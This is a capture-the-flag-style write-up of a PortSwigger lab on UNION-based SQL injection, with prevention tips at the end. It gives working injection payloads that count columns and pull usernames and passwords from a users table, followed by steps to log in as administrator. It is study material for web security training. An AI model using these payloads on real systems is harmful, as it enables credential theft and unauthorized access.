SQL Injection: Retrieving Data from Other Tables (UNION)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

Vulnerability

The application is vulnerable to SQL injection via the "category" parameter.
This allows attackers to use UNION-based SQL injection to retrieve data from other tables.

---

Payload

' UNION SELECT username, password FROM users--

---

Exploitation Steps

1. Navigate to a product category.

2. Determine the number of columns:

' UNION SELECT NULL,NULL--

→ The query returns 2 columns

3. Perform UNION injection to extract credentials:

' UNION SELECT username, password FROM users--

4. The application displays usernames and passwords.

5. Use the retrieved credentials to log in as:

username: administrator
password: <retrieved password>

---

Why the Attack Works

The original query:

SELECT name, description FROM products WHERE category='Gifts'

Injected query:

SELECT name, description FROM products WHERE category='Gifts'
UNION SELECT username, password FROM users--

- "UNION" merges results from another table
- Matching column count allows successful execution
- Sensitive data is returned in the response

---

Prevention

- Use parameterized queries
- Avoid concatenating user input into SQL queries
- Implement strict input validation
